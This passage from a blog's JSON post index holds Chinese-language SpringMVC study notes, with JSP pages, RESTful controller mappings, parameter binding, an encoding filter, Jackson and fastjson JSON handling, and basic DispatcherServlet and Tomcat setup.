class&#x3D;&quot;row&quot;&gt; &lt;div class&#x3D;&quot;col-md-4 column&quot;&gt; &lt;a class&#x3D;&quot;btn btn-primary&quot; href&#x3D;&quot;$&#123;pageContext.request.contextPath&#125;&#x2F;book&#x2F;toAddBook&quot;&gt;新增&lt;&#x2F;a&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;div class&#x3D;&quot;row clearfix&quot;&gt; &lt;div class&#x3D;&quot;col-md-12 column&quot;&gt; &lt;table class&#x3D;&quot;table table-hover table-striped&quot;&gt; &lt;thead&gt; &lt;tr&gt; &lt;th&gt;书籍编号&lt;&#x2F;th&gt; &lt;th&gt;书籍名字&lt;&#x2F;th&gt; &lt;th&gt;书籍数量&lt;&#x2F;th&gt; &lt;th&gt;书籍详情&lt;&#x2F;th&gt; &lt;th&gt;操作&lt;&#x2F;th&gt; &lt;&#x2F;tr&gt; &lt;&#x2F;thead&gt; &lt;tbody&gt; &lt;c:forEach var&#x3D;&quot;book&quot; items&#x3D;&quot;$&#123;requestScope.get(&#39;list&#39;)&#125;&quot;&gt; &lt;tr&gt; &lt;td&gt;$&#123;book.getBookID()&#125;&lt;&#x2F;td&gt; &lt;td&gt;$&#123;book.getBookName()&#125;&lt;&#x2F;td&gt; &lt;td&gt;$&#123;book.getBookCounts()&#125;&lt;&#x2F;td&gt; &lt;td&gt;$&#123;book.getDetail()&#125;&lt;&#x2F;td&gt; &lt;td&gt; &lt;a href&#x3D;&quot;$&#123;pageContext.request.contextPath&#125;&#x2F;book&#x2F;toUpdateBook?id&#x3D;$&#123;book.getBookID()&#125;&quot;&gt;更改&lt;&#x2F;a&gt; | &lt;a href&#x3D;&quot;$&#123;pageContext.request.contextPath&#125;&#x2F;book&#x2F;del&#x2F;$&#123;book.getBookID()&#125;&quot;&gt;删除&lt;&#x2F;a&gt; &lt;&#x2F;td&gt; &lt;&#x2F;tr&gt; &lt;&#x2F;c:forEach&gt; &lt;&#x2F;tbody&gt; &lt;&#x2F;table&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt;&lt;&#x2F;div&gt; 18.updateBook.jsp 12345678910111213141516171819202122232425262728293031&lt;%@ taglib prefix&#x3D;&quot;c&quot; uri&#x3D;&quot;http:&#x2F;&#x2F;java.sun.com&#x2F;jsp&#x2F;jstl&#x2F;core&quot; %&gt;&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; %&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;修改信息&lt;&#x2F;title&gt; &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt; &lt;!-- 引入 Bootstrap --&gt; &lt;link href&#x3D;&quot;https:&#x2F;&#x2F;cdn.bootcss.com&#x2F;bootstrap&#x2F;3.3.7&#x2F;css&#x2F;bootstrap.min.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;div class&#x3D;&quot;container&quot;&gt; &lt;div class&#x3D;&quot;row clearfix&quot;&gt; &lt;div class&#x3D;&quot;col-md-12 column&quot;&gt; &lt;div class&#x3D;&quot;page-header&quot;&gt; &lt;h1&gt; &lt;small&gt;修改信息&lt;&#x2F;small&gt; &lt;&#x2F;h1&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;form action&#x3D;&quot;$&#123;pageContext.request.contextPath&#125;&#x2F;book&#x2F;updateBook&quot; method&#x3D;&quot;post&quot;&gt; &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;bookID&quot; value&#x3D;&quot;$&#123;book.getBookID()&#125;&quot;&#x2F;&gt; 书籍名称：&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;bookName&quot; value&#x3D;&quot;$&#123;book.getBookName()&#125;&quot;&#x2F;&gt; 书籍数量：&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;bookCounts&quot; value&#x3D;&quot;$&#123;book.getBookCounts()&#125;&quot;&#x2F;&gt; 书籍详情：&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;detail&quot; value&#x3D;&quot;$&#123;book.getDetail() &#125;&quot;&#x2F;&gt; &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&#x2F;&gt; &lt;&#x2F;form&gt;&lt;&#x2F;div&gt; 19.在项目结构中配置lib库后，配置Tomcat运行即可。 总体项目结构","categories":[{"name":"ssm学习","slug":"ssm学习","permalink":"https://ggyggy666.github.io/categories/ssm%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"SpringMVC学习(3)","slug":"SpringMVC学习-3","permalink":"https://ggyggy666.github.io/tags/SpringMVC%E5%AD%A6%E4%B9%A0-3/"}],"keywords":[{"name":"ssm学习","slug":"ssm学习","permalink":"https://ggyggy666.github.io/categories/ssm%E5%AD%A6%E4%B9%A0/"}]},{"title":"SpringMVC学习(2)","slug":"SpringMVC学习-2","date":"2021-07-08T07:50:17.000Z","updated":"2021-07-08T09:39:50.502Z","comments":true,"path":"2021/07/08/SpringMVC学习-2/","link":"","permalink":"https://ggyggy666.github.io/2021/07/08/SpringMVC%E5%AD%A6%E4%B9%A0-2/","excerpt":"今天继续学习SpringMVC。","text":"今天继续学习SpringMVC。 RestFul正常的URL访问是：https://www.xxx.com/add?a=1&amp;b=2，这样会暴露变量名a和b，而且也容易知道使用GET方式请求。使用RestFul风格，会变成：https://www.xxxx.com/add/1/2，这样就根本不知道是什么变量和请求方式了。 传统风格传参 12345678910@Controllerpublic class Controller1 &#123; @RequestMapping(&quot;&#x2F;add&quot;) public String sayGGY(int a, int b, Model model)&#123; int c &#x3D; a+b; model.addAttribute(&quot;msg&quot;, c); return &quot;hello&quot;; &#125;&#125; 访问：http://localhost:8080/04_Annotation_war_exploded/add?a=1&amp;b=2，得到结果3. 传的参数名a和b必须与sayGGY中的参数a,b一致，类型也要一致。而且请求方式没有限制。 RestFul风格 12345678910@Controllerpublic class Controller1 &#123; @GetMapping(&quot;&#x2F;add&#x2F;&#123;p1&#125;&#x2F;&#123;p2&#125;&quot;) public String sayGGY(@PathVariable int p1, @PathVariable int p2, Model model)&#123; int c &#x3D; p1+p2; model.addAttribute(&quot;msg&quot;, c); return &quot;hello&quot;; &#125;&#125; @GetMapping表示GET请求方式，可以切换@PostMapping等方式。 /add/{p1}/{p2}，需要用路径占位符来占着传进来的变量。 @PathVariable，在参数前要添加这个。参数变量名p1,p2要与占位符一致。 访问：http://localhost:8080/04_Annotation_war_exploded/add/1/2即可得到结果。 Spring转发和重定向之前最开始是使用model.setViewName来转发文件名，注解方式是使用return “文件名”，然后与视图解析器中的前缀和后缀一起拼接再转发到对应目录的文件。那么如果不用视图解析器的话，有三种方式： 1.JSP文件的完整相对路径。 1return &quot;&#x2F;WEB-INF&#x2F;jsp&#x2F;hello.jsp&quot; 2.加forward前缀 1return &quot;forward:&#x2F;WEB-INF&#x2F;jsp&#x2F;hello.jsp&quot; 1和2其实一样，都是转发,URL不变 3.加redirect重定向 1return &quot;redirect:&#x2F;WEB-INF&#x2F;jsp&#x2F;hello.jsp&quot; URL会变。 数据处理数据接收 1.请求提交的参数名与接收的参数名必须一致。 请求是：xxx/hello?name=ggy 12345@RequestMapping(&quot;&#x2F;hello&quot;)public String hello(String name)&#123; System.out.println(name); return &quot;hello&quot;;&#125; name必须一致。 2.请求参数名与后台的注解的参数名一致，处理的参数名可以不一致。 请求：xxx/hello?username=ggy 12345@RequestMapping(&quot;&#x2F;hello&quot;)public String hello(@RequestParam(&quot;username&quot;) String name)&#123; System.out.println(name); return &quot;hello&quot;;&#125; username一致。 3.提交多个参数，当然可以接收时用多个对应的参数，但是也可以使用一个对象，该对象的字段包含这些参数并且名称都一一对应。 设置一个User类 12345678public class User &#123; private int id; private String name; private int age; &#x2F;&#x2F;构造 &#x2F;&#x2F;get&#x2F;set &#x2F;&#x2F;tostring()&#125; 请求：xxx/user?id=1&amp;name=ggy&amp;age=18 12345@RequestMapping(&quot;&#x2F;user&quot;)public String user(User user)&#123; System.out.println(user); return &quot;hello&quot;;&#125; 使用一个User user来接收，字段与请求的参数名要一致。 数据展示 1.最初的ModelAndView 12345678910public class ControllerTest1 implements Controller &#123; public ModelAndView handleRequest(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse) throws Exception &#123; &#x2F;&#x2F;返回一个模型视图对象 ModelAndView mv &#x3D; new ModelAndView(); mv.addObject(&quot;msg&quot;,&quot;ControllerTest1&quot;); mv.setViewName(&quot;test&quot;); return mv; &#125;&#125; 2.注解方式的ModelMap 12345678@RequestMapping(&quot;&#x2F;hello&quot;)public String hello(@RequestParam(&quot;username&quot;) String name, ModelMap modelMap)&#123; &#x2F;&#x2F;封装要显示到视图中的数据 &#x2F;&#x2F;相当于req.setAttribute(&quot;name&quot;,name); modelMap.addAttribute(&quot;name&quot;,name); System.out.println(name); return &quot;hello&quot;;&#125; 3.注解方式的Model 12345678@RequestMapping(&quot;&#x2F;ct2&#x2F;hello&quot;)public String hello(@RequestParam(&quot;username&quot;) String name, Model model)&#123; &#x2F;&#x2F;封装要显示到视图中的数据 &#x2F;&#x2F;相当于req.setAttribute(&quot;name&quot;,name); model.addAttribute(&quot;msg&quot;,name); System.out.println(name); return &quot;test&quot;;&#125; Model是简化版，大部分情况使用它就可以了。 乱码问题提交中文时会乱码，在web.xml中可以增加Spring的过滤器。 123456789101112&lt;filter&gt; &lt;filter-name&gt;encoding&lt;&#x2F;filter-name&gt; &lt;filter-class&gt;org.springframework.web.filter.CharacterEncodingFilter&lt;&#x2F;filter-class&gt; &lt;init-param&gt; &lt;param-name&gt;encoding&lt;&#x2F;param-name&gt; &lt;param-value&gt;utf-8&lt;&#x2F;param-value&gt; &lt;&#x2F;init-param&gt;&lt;&#x2F;filter&gt;&lt;filter-mapping&gt; &lt;filter-name&gt;encoding&lt;&#x2F;filter-name&gt; &lt;url-pattern&gt;&#x2F;*&lt;&#x2F;url-pattern&gt;&lt;&#x2F;filter-mapping&gt; 注意必须用/*才能过滤所有页面，只是/无法过滤jsp页面。 也要可能是tomcat配置文件的乱码，可能是浏览器前端展示设置的编码不正确。 JSON传输前端对象转JSON字符串 1var json &#x3D; JSON.stringify(&#123;a: &#39;Hello&#39;, b: &#39;World&#39;&#125;); JSON字符串转对象 1var obj &#x3D; JSON.parse(&#39;&#123;&quot;a&quot;: &quot;Hello&quot;, &quot;b&quot;: &quot;World&quot;&#125;&#39;); 后端：Jackson这里先使用json解析工具jackson 1.新建一个模块05-JSON，将其添加框架支持，项目结构添加上lib。 2.在pom.xml添加jackson依赖 1234567&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;&#x2F;groupId&gt; &lt;artifactId&gt;jackson-databind&lt;&#x2F;artifactId&gt; &lt;version&gt;2.10.5.1&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt;&lt;&#x2F;dependencies&gt; 3.在web.xml中增加DispatchServlet和解决乱码的请求过滤器 123456789101112131415161718192021222324252627282930313233343536373839&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;web-app xmlns&#x3D;&quot;http:&#x2F;&#x2F;xmlns.jcp.org&#x2F;xml&#x2F;ns&#x2F;javaee&quot; xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot; xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;xmlns.jcp.org&#x2F;xml&#x2F;ns&#x2F;javaee http:&#x2F;&#x2F;xmlns.jcp.org&#x2F;xml&#x2F;ns&#x2F;javaee&#x2F;web-app_4_0.xsd&quot; version&#x3D;&quot;4.0&quot;&gt; &lt;!--1.注册servlet--&gt; &lt;servlet&gt; &lt;servlet-name&gt;SpringMVC&lt;&#x2F;servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;&#x2F;servlet-class&gt; &lt;!--通过初始化参数指定SpringMVC配置文件的位置，进行关联--&gt; &lt;init-param&gt; &lt;param-name&gt;contextConfigLocation&lt;&#x2F;param-name&gt; &lt;param-value&gt;classpath:springmvc-servlet.xml&lt;&#x2F;param-value&gt; &lt;&#x2F;init-param&gt; &lt;!-- 启动顺序，数字越小，启动越早 --&gt; &lt;load-on-startup&gt;1&lt;&#x2F;load-on-startup&gt; &lt;&#x2F;servlet&gt; &lt;!--所有请求都会被springmvc拦截 --&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;SpringMVC&lt;&#x2F;servlet-name&gt; &lt;url-pattern&gt;&#x2F;&lt;&#x2F;url-pattern&gt; &lt;&#x2F;servlet-mapping&gt; &lt;filter&gt; &lt;filter-name&gt;encoding&lt;&#x2F;filter-name&gt; &lt;filter-class&gt;org.springframework.web.filter.CharacterEncodingFilter&lt;&#x2F;filter-class&gt; &lt;init-param&gt; &lt;param-name&gt;encoding&lt;&#x2F;param-name&gt; &lt;param-value&gt;utf-8&lt;&#x2F;param-value&gt; &lt;&#x2F;init-param&gt; &lt;&#x2F;filter&gt; &lt;filter-mapping&gt; &lt;filter-name&gt;encoding&lt;&#x2F;filter-name&gt; &lt;url-pattern&gt;&#x2F;*&lt;&#x2F;url-pattern&gt; &lt;&#x2F;filter-mapping&gt;&lt;&#x2F;web-app&gt; 4.在springmvc-servlet.xml中 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;beans xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&quot; xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot; xmlns:context&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;context&quot; xmlns:mvc&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;mvc&quot; xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&#x2F;spring-beans.xsd http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;context https:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;context&#x2F;spring-context.xsd http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;mvc https:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;mvc&#x2F;spring-mvc.xsd&quot;&gt; &lt;!-- 自动扫描指定的包，下面所有注解类交给IOC容器管理 --&gt; &lt;context:component-scan base-package&#x3D;&quot;com.ggy.controller&quot;&#x2F;&gt; &lt;!-- 视图解析器 --&gt; &lt;bean class&#x3D;&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot; id&#x3D;&quot;internalResourceViewResolver&quot;&gt; &lt;!-- 前缀 --&gt; &lt;property name&#x3D;&quot;prefix&quot; value&#x3D;&quot;&#x2F;WEB-INF&#x2F;jsp&#x2F;&quot; &#x2F;&gt; &lt;!-- 后缀 --&gt; &lt;property name&#x3D;&quot;suffix&quot; value&#x3D;&quot;.jsp&quot; &#x2F;&gt; &lt;&#x2F;bean&gt; &lt;mvc:annotation-driven&gt; &lt;mvc:message-converters register-defaults&#x3D;&quot;true&quot;&gt; &lt;bean class&#x3D;&quot;org.springframework.http.converter.StringHttpMessageConverter&quot;&gt; &lt;constructor-arg value&#x3D;&quot;UTF-8&quot;&#x2F;&gt; &lt;&#x2F;bean&gt; &lt;bean class&#x3D;&quot;org.springframework.http.converter.json.MappingJackson2HttpMessageConverter&quot;&gt; &lt;property name&#x3D;&quot;objectMapper&quot;&gt; &lt;bean class&#x3D;&quot;org.springframework.http.converter.json.Jackson2ObjectMapperFactoryBean&quot;&gt; &lt;property name&#x3D;&quot;failOnEmptyBeans&quot; value&#x3D;&quot;false&quot;&#x2F;&gt; &lt;&#x2F;bean&gt; &lt;&#x2F;property&gt; &lt;&#x2F;bean&gt; &lt;&#x2F;mvc:message-converters&gt; &lt;&#x2F;mvc:annotation-driven&gt;&lt;&#x2F;beans&gt; 添加了返回JSON数据时乱码解决的配置。 5.编写Utils下的JsonUtils工具类，提供对象转换成JSON数据的功能 123456789101112131415161718192021222324252627282930313233package com.ggy.utils;import com.fasterxml.jackson.core.JsonProcessingException;import com.fasterxml.jackson.databind.ObjectMapper;import com.fasterxml.jackson.databind.SerializationFeature;import java.text.SimpleDateFormat;public class JsonUtils &#123; public static String getJson(Object object) &#123; return getJson(object,&quot;yyyy-MM-dd HH:mm:ss&quot;); &#125; public static String getJson(Object object, String dateFormat) &#123; ObjectMapper mapper &#x3D; new ObjectMapper(); &#x2F;&#x2F;java自定义日期格式 SimpleDateFormat sdf &#x3D; new SimpleDateFormat(dateFormat); &#x2F;&#x2F;sdf.format(date) &#x2F;&#x2F; 使用ObjectMapper 来格式化输出 mapper.configure(SerializationFeature.WRITE_DATES_AS_TIMESTAMPS,false); mapper.setDateFormat(sdf); try &#123; &#x2F;&#x2F;ObjectMapper,时间解析后的默认格式为：TImestamp.时间戳 return mapper.writeValueAsString(object); &#125; catch (JsonProcessingException e) &#123; e.printStackTrace(); &#125; return null; &#125;&#125; 使用了函数重载，不是时间类型的对象就只传一个，时间类型的就传时间和格式。 6.编写userController 1234567891011@Controllerpublic class userController &#123; @RequestMapping(&quot;&#x2F;j1&quot;) @ResponseBody public String Json()&#123; User user &#x3D; new User(1, &quot;我是&quot;, &quot;ggy&quot;); String json &#x3D; JsonUtils.getJson(user); return json; &#125;&#125; 使用@ResponseBody表明只返回字符串而不经过视图解析器。也可以直接将@Controller转换成@RestController。 12345678910@RestControllerpublic class userController &#123; @RequestMapping(&quot;&#x2F;j1&quot;) public String Json()&#123; User user &#x3D; new User(1, &quot;我是&quot;, &quot;ggy&quot;); String json &#x3D; JsonUtils.getJson(user); return json; &#125;&#125; 1234567@RequestMapping(&quot;&#x2F;j2&quot;) public String json3()&#123; Date date &#x3D; new Date(); return JsonUtils.getJson(date,&quot;yyyy-MM-dd HH:mm:ss&quot;); &#125;&#125; 后端：fastJson阿里的fastJson 在pom.xml中导入包 12345&lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;&#x2F;groupId&gt; &lt;artifactId&gt;fastjson&lt;&#x2F;artifactId&gt; &lt;version&gt;1.2.60&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt; 之后直接使用 对象转JSON字符串 1JSON.toJSONString(user); JSON字符串转对象 1JSON.parseObject(str, User.class) JAVA对象转JSON对象 1JSONObject jsonObject1 &#x3D; (JSONObject) JSON.toJSON(user2); JSON对象转JAVA对象 1User to_java_user &#x3D; JSON.toJavaObject(jsonObject1, User.class);","categories":[{"name":"ssm学习","slug":"ssm学习","permalink":"https://ggyggy666.github.io/categories/ssm%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"SpringMVC学习(1)","slug":"SpringMVC学习-1","permalink":"https://ggyggy666.github.io/tags/SpringMVC%E5%AD%A6%E4%B9%A0-1/"}],"keywords":[{"name":"ssm学习","slug":"ssm学习","permalink":"https://ggyggy666.github.io/categories/ssm%E5%AD%A6%E4%B9%A0/"}]},{"title":"SpringMVC学习(1)","slug":"SpringMVC学习-1","date":"2021-07-07T09:11:06.000Z","updated":"2021-07-08T03:30:46.575Z","comments":true,"path":"2021/07/07/SpringMVC学习-1/","link":"","permalink":"https://ggyggy666.github.io/2021/07/07/SpringMVC%E5%AD%A6%E4%B9%A0-1/","excerpt":"大概学完Spring5了，虽然运用还不熟练，但由于时间紧迫，还是先把SpringMVC学了。","text":"大概学完Spring5了，虽然运用还不熟练，但由于时间紧迫，还是先把SpringMVC学了。 参考文章： https://blog.csdn.net/qq_34473348/article/details/107758882 https://github.com/lzh66666/SpringMVC-kuang-/tree/master 这些文章讲得挺清楚了，我就简单讲一下自己的理解并实践。 MVC架构模型，视图，控制器。 Model，处理业务逻辑，与数据库进行交互，一般是Service层和Dao层。 View，页面显示。一般是JSP页面。 Controller，负责接收用户请求，将请求转发，调用相应的业务层，然后获得的数据返回给页面展示。一般是Servlet。 整个流程： 用户通过视图发起请求。 控制器Servlet接收到请求，将请求转发调用相应的业务逻辑层。 业务处理完毕，返回数据给控制器Servlet。 控制器Servlet将数据转给视图JSP页面，让JSP进行渲染。 响应到前端。 有一点注意的，通常实体类比如User，会写在pojo包里，这个User类拥有用户名、密码、生日、邮箱和个性签名等等属性，而用户请求登陆的时候一般只需要用户名和密码，这个时候可能会把这个实体类User拆分，即创建一个vo包，vo也是实体类的包名，对应的实体类是userVo（它只有用户名和密码），而pojo是实体类User的包名，拥有全部属性或者除用户名和密码之外的属性。总之，见到vo包等这种实体类的包名就不用迷茫了！ 回顾Servlet1.新建一个Maven项目，名称是SpringMVC，作为父工程。在pom.xml下导入依赖 123456789101112131415161718192021222324252627&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;&#x2F;groupId&gt; &lt;artifactId&gt;junit&lt;&#x2F;artifactId&gt; &lt;version&gt;4.12&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;&#x2F;groupId&gt; &lt;artifactId&gt;spring-webmvc&lt;&#x2F;artifactId&gt; &lt;version&gt;5.1.9.RELEASE&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;&#x2F;groupId&gt; &lt;artifactId&gt;servlet-api&lt;&#x2F;artifactId&gt; &lt;version&gt;2.5&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;javax.servlet.jsp&lt;&#x2F;groupId&gt; &lt;artifactId&gt;jsp-api&lt;&#x2F;artifactId&gt; &lt;version&gt;2.2&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;&#x2F;groupId&gt; &lt;artifactId&gt;jstl&lt;&#x2F;artifactId&gt; &lt;version&gt;1.2&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt;&lt;&#x2F;dependencies&gt; 2.新建一个模块01-Servlet，然后在pom.xml中导入依赖 123456789101112&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;&#x2F;groupId&gt; &lt;artifactId&gt;servlet-api&lt;&#x2F;artifactId&gt; &lt;version&gt;2.5&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;javax.servlet.jsp&lt;&#x2F;groupId&gt; &lt;artifactId&gt;jsp-api&lt;&#x2F;artifactId&gt; &lt;version&gt;2.2&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt;&lt;&#x2F;dependencies&gt; 3.因为新建的模块都是普通类型的项目，在创建时并没有选择webapp，因此需要在模块上右键 点击添加框架支持，进入后 勾选上，确认即可出现web目录。 4.新建com.ggy.servlet包，创建helloServlet类 内容如下： 1234567891011121314151617181920212223242526package com.ggy.servlet;import javax.servlet.ServletException;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;public class helloServlet extends HttpServlet &#123; @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; String method&#x3D;req.getParameter(&quot;method&quot;); if(method.equals(&quot;add&quot;))&#123; req.getSession().setAttribute(&quot;msg&quot;, &quot;add...&quot;); &#125; if(method.equals(&quot;delete&quot;))&#123; req.getSession().setAttribute(&quot;msg&quot;, &quot;delete...&quot;); &#125; req.getRequestDispatcher(&quot;&#x2F;WEB-INF&#x2F;jsp&#x2F;test.jsp&quot;).forward(req,resp); &#125; @Override protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; doGet(req,resp); &#125;&#125; 5.有了Servlet就需要将其配置在web.xml中 12345678&lt;servlet&gt; &lt;servlet-name&gt;helloServlet&lt;&#x2F;servlet-name&gt; &lt;servlet-class&gt;com.ggy.servlet.helloServlet&lt;&#x2F;servlet-class&gt;&lt;&#x2F;servlet&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;helloServlet&lt;&#x2F;servlet-name&gt; &lt;url-pattern&gt;&#x2F;hello&lt;&#x2F;url-pattern&gt;&lt;&#x2F;servlet-mapping&gt; 6.helloServlet会将请求转发给/WEB-INF/jsp/test.jsp，因此需要创建目录和test.jsp 7.最后还需要创建一个JSP页面，内容是form表单登陆。 8.之后添加tomcat配置 点击左上角+添加Tomcat，然后右下角点击FIx 选择后 之后就可以修改路径并且应用了。点击启动后 访问：http://localhost:8080/01_Servlet_war_exploded/hello?method=add即可。 HelloSpringMVC在上面的Servlet中，需要编写Servlet并在web.xml中，而如果是多个Servlet就需要配置多个，显然很麻烦。SpringMVC则是提供了一个Front Controller，接收到请求时，决定将其发送给对应的Servlet，这样就不用在web.xml配置那么麻烦了。 1.新建模块02-HelloSpringMVC，右键添加框架支持 2.在web.xml中导入SpringMVC需要的东西 12345678910111213141516171819&lt;!--1.注册DispatcherServlet--&gt;&lt;servlet&gt; &lt;servlet-name&gt;springmvc&lt;&#x2F;servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;&#x2F;servlet-class&gt; &lt;!--关联一个springmvc的配置文件:【servlet-name】-servlet.xml--&gt; &lt;init-param&gt; &lt;param-name&gt;contextConfigLocation&lt;&#x2F;param-name&gt; &lt;param-value&gt;classpath:springmvc-servlet.xml&lt;&#x2F;param-value&gt; &lt;&#x2F;init-param&gt; &lt;!--启动级别-1--&gt; &lt;load-on-startup&gt;1&lt;&#x2F;load-on-startup&gt;&lt;&#x2F;servlet&gt;&lt;!--&#x2F; 匹配所有的请求；（不包括.jsp）--&gt;&lt;!--&#x2F;* 匹配所有的请求；（包括.jsp）--&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;springmvc&lt;&#x2F;servlet-name&gt; &lt;url-pattern&gt;&#x2F;&lt;&#x2F;url-pattern&gt;&lt;&#x2F;servlet-mapping&gt; 这个Front Controller实质就是一个Servlet，不过是Spring框架中自己写好的，我们只需要在web.xml中配置就能用了。 3.因为是Spring项目，所以需要在src的main目录下的resources资源目录下添加springmvc-servlet.xml文件 1234567&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;beans xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&quot; xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot; xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&#x2F;spring-beans.xsd&quot;&gt;&lt;&#x2F;beans&gt; 4.这里需要增加几个Spring的bean对象 1234567891011&lt;bean class&#x3D;&quot;org.springframework.web.servlet.handler.BeanNameUrlHandlerMapping&quot;&#x2F;&gt;&lt;bean class&#x3D;&quot;org.springframework.web.servlet.mvc.SimpleControllerHandlerAdapter&quot;&#x2F;&gt;&lt;!--视图解析器:DispatcherServlet给他的ModelAndView--&gt;&lt;bean class&#x3D;&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot; id&#x3D;&quot;InternalResourceViewResolver&quot;&gt; &lt;!--前缀--&gt; &lt;property name&#x3D;&quot;prefix&quot; value&#x3D;&quot;&#x2F;WEB-INF&#x2F;jsp&#x2F;&quot;&#x2F;&gt; &lt;!--后缀--&gt; &lt;property name&#x3D;&quot;suffix&quot; value&#x3D;&quot;.jsp&quot;&#x2F;&gt;&lt;&#x2F;bean&gt; 这里处理器和适配器其实是可以不写的。 视图解析器DispatcherServlet是当Front Controller接收到处理业务后的数据时转发给JSP页面，定义了前缀和后缀，之后会与转发时的那个文件名一起拼接的。 5.在src/main/java下新建包com.ggy.controller，新建HelloController类 1234567891011121314&#x2F;&#x2F;注意：这里我们先导入Controller接口public class HelloController implements Controller &#123; public ModelAndView handleRequest(HttpServletRequest request, HttpServletResponse response) throws Exception &#123; &#x2F;&#x2F;ModelAndView 模型和视图 ModelAndView mv &#x3D; new ModelAndView(); &#x2F;&#x2F;封装对象，放在ModelAndView中。Model mv.addObject(&quot;msg&quot;,&quot;HelloSpringMVC!&quot;); &#x2F;&#x2F;封装要跳转的视图，放在ModelAndView中 mv.setViewName(&quot;hello&quot;); &#x2F;&#x2F;: &#x2F;WEB-INF&#x2F;jsp&#x2F;hello.jsp return mv; &#125;&#125; setViewName就是转发，hello是要转发的文件名称，与先前的springmvc-servlet.xml中配置的前缀和后缀一起拼接得到：/WEB-INF/jsp/hello.jsp 6.因此需要创建/WEB-INF/jsp/hello.jsp 7.将那个HelloController配置到Spring中作为Bean对象 1&lt;bean id=\"/hello\" class=\"com.ggy.controller.HelloController\"/&gt; 8.配置Tomcat启动，发现404。点击File-&gt;ProjectStruct 如图，在WEB-INF目录下新建lib目录，然后点击+，将库文件都添加进来。注意要点击一下切换到02-HelloSpringMVC.war那个先！ 9.重新部署，启动即可看到HelloSpringMVC。 简单流程： 1./hello请求经过DispatcherServlet，然后寻找处理器去匹配到请求对应的bean对象/hello。 2.适配器会通过/hello这个Bean对象对应的Class进入指向的类。 3.在类中处理了业务逻辑后，得到的数据可以通过AddObject方法存储，并且返回一个ModelAndView对象，使用setViewName(“JSP文件名”)转发到某个JSP页面。 